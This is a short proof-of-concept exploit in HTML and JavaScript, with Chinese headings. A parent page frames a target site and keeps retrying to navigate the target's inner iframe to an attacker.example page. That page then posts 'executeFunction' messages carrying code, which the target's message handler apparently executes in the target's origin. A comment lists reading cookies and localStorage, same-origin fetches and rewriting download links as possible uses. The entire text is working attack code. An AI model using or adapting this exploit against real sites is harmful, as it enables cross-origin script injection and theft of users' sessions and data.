# 攻击页（父页）
<iframe id="v" src="https://target.example/landing"></iframe>
<script>
var ready=false, attempts=0;
addEventListener('message', e=>{ if(e.data==='inner-ready') ready=true; });
function nav(){
  if(ready) return; attempts++;
  var w=document.getElementById('v').contentWindow;
  var len=0; try{ len=w.length; }catch(e){}
  if(len>0){ try{ w.frames[0].location='https://attacker.example/inner.html'; }catch(e){} }
}
// 目标页常在异步配置加载后才 setAttribute('src', child)，过早导航会被覆盖：
setTimeout(()=>{ nav(); setInterval(()=>{ if(!ready && attempts<12) nav(); }, 2500); }, 7000);
</script>

# 攻击者内页（被导航进 #ifr，跨源但 source 匹配）
<script>
const BODY = `(function(){
  window.__pwned=1; document.title='PWNED';
  // 此处即目标源：可读写 DOM / cookie / localStorage / fetch 同源资源 / 改写下载链接
})();`;
top.postMessage('inner-ready','*');   // 通知父页停止重试（可选）
parent.postMessage({action:'executeFunction', functionBody: BODY}, '*');
setInterval(()=>parent.postMessage({action:'executeFunction', functionBody: BODY}, '*'), 400);
</script>
